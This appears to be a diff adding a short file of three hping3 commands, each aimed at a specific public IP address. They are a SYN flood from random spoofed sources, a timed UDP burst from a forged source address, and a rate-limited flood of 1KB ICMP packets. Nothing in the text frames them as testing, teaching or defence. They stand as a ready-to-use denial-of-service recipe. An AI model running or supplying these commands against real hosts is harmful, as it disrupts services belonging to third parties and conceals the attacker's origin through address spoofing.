@@ -1,0 +1,8 @@
+1) Send 10,000 TCP packets all at once from random source IP addresses:
+hping3 -S --flood --rand-source -c 10000 147.182.144.203
+ 
+2) Send 9,000 UDP packets in a span of 90 seconds from a spoofed source address:
+hping3 -2 -c 9000 -i u10000 -a 192.168.1.100 147.182.144.203
+ 
+3) Send 11,000 ICMP packets with a data size of 1KB at an interval of 75 packets per second:
+hping3 -1 -c 11000 -d 1024 -i u13333 147.182.144.203
